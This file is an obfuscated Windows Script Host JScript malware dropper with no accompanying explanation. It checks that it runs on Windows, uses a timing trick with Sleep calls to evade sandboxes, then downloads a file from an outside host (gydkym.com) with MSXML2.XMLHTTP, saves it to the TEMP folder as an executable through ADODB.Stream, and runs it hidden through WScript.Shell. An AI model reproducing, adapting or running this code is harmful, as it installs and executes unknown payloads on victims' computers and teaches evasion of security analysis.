var Rlchxzpemr = false;
var Arbbyhz = "CreateObject";
var Gfcfc = function Pkxydzr() {return WScript[Arbbyhz]("WScript.Shell");}();
var Mloelk = 123213;
var Hgkdovxeui = "MSXML2.XMLHTTP";
var Ndoopzkagm = 2123213;
var Qhesuvtz = 0;
function Cksofluv(Fvfjn){Gfcfc["Run"](Fvfjn, Qhesuvtz, Qhesuvtz);};
function Djhxrze(){return Hgkdovxeui;};
function Eihswz(Ipbttr, Lrejmn){return Ipbttr - Lrejmn;};
function Leumzp(){return Arbbyhz;};
/*@cc_on
  @if (@_win32 || @_win64)
    Rlchxzpemr = true;
  @end
@*/
var Yvzfrsae = "";
if (Rlchxzpemr)
{
function Pqwkwbs(){return 22;};
var Cdvotzwqyu = 0; var Zeofzbgtll = 0;
function Bslroyxu()
{
var Tjvgybkl = new this["Date"]();
var Iddowb = Tjvgybkl["getUTCMilliseconds"]();
WScript["Sleep"](Pqwkwbs());
var Tjvgybkl = new this["Date"]();
var Otazyqgi = Tjvgybkl["getUTCMilliseconds"]();
WScript["Sleep"](Pqwkwbs());
var Tjvgybkl = new this["Date"]();
var Gslnssam = Tjvgybkl["getUTCMilliseconds"]();
var Cdvotzwqyu = "Weaojitfsd";
Cdvotzwqyu = Eihswz(Otazyqgi, Iddowb);
var Zeofzbgtll = "Etnyhvv";
Zeofzbgtll = Eihswz(Gslnssam, Otazyqgi);
Yvzfrsae = "open";
return Eihswz(Cdvotzwqyu, Zeofzbgtll);
}
var Ecezytvn = false;
var Labpbioszq = false;
for (var Ojtorcnlq = Qhesuvtz; Ojtorcnlq < Pqwkwbs() * 1; Ojtorcnlq++){if (Bslroyxu() != Qhesuvtz){
Ecezytvn = true; 
Zeofzbgtll = "07t9gasdf76ags" + 123313 * Cdvotzwqyu + Zeofzbgtll; 
Labpbioszq = true; 
Zeofzbgtll = "07t9gasdf76ags" + 123313 * Cdvotzwqyu + Zeofzbgtll; 
break;
}}
function Acitgesilc() {return ((Ecezytvn == true) && (Ecezytvn == Labpbioszq)) ? 1 : Qhesuvtz;};
if (Ecezytvn && Acitgesilc() && Labpbioszq){
function Qczmfu() {return Gfcfc["ExpandEnvironmentStrings"]("%TEMP%/") + "bBaLfcMrP83yK.exe";};
 Ivetlx = Djhxrze();
 Ljfrkxphit = WScript[Arbbyhz](Ivetlx);
 var Lfttt = 1;
 while (Lfttt){
try {
Ljfrkxphit[Yvzfrsae]("GET", "http://gydkym.com/dk3s8sja", false);
Ljfrkxphit["send"]();
Hrgeoeau = "Sleep";
do {WScript[Hrgeoeau](Pqwkwbs() * 11)} while (Ljfrkxphit["readystate"] < 4 );
Lfttt = Qhesuvtz;
} catch(Gqijlkmue){Lfttt = ("asdfa", "fadfasdf", "afdafa", 2);};
}
function Mcphz(Jywvos) {var Cbvdrdm = (1, 2, 3, 4, 5, Jywvos); return Cbvdrdm;};
Jwuhdrz = WScript[Leumzp()]("ADODB.Stream");
Ivetlx = Jwuhdrz;
Ivetlx[Yvzfrsae]();
Ivetlx["type"] = Mcphz(1);
Ivetlx["write"](Ljfrkxphit["ResponseBody"]);
Jwuhdrz["position"] = Mcphz(Qhesuvtz);
Ivetlx["SaveToFile"](Qczmfu(), Mcphz(2) );
Jwuhdrz["close"]();
Cksofluv(Qczmfu());
}
}

